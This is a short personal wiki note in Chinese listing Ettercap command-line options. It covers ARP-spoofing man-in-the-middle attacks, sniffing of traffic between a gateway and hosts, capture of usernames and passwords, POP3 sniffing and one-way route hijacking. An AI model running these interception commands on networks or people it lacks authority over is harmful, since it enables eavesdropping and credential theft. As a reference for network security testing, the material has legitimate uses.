Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.4
Creation-Date: 2014-09-08T21:41:39+08:00

====== Ettercap ======
Created Monday 08 September 2014

-M arp:remote||oneway   mac/ip/port
-M icmp:mac/ip ## not for swithed LAN
下面列出几个常用的参数组合：
ettercap -Tzq 
以命令行方式显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息。
ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2-10/
嗅探网关（192.168.1.1）与部分主机（192.168.1.2-10）之间相互通信的数据包。
ettercap -Tzq //110
只嗅探本机110端口（pop3）的信息
ettercap -Tzq /10.0.0.1/21,22,23
只嗅探本机与10.0.0.1主机在端口21、22、23上的通信
ettercap -i eth0 -Tq -L sniffed_data -F filter.ef -M arp:remote /10.1.1.2/80 //
在eth0网卡上用自己的filter嗅探ip为10.1.1.2主机在80端口上的所有通信，并把所有的数据包保存成文件名为“sniffed_data”的文件
ettercap -i eth0 -Tq -L sniffed_data -F filter.ef -M arp:remote /10.1.1.1/ /10.1.1.2/
单向欺骗路由，只劫持路由发向10.1.1.2的数据包。
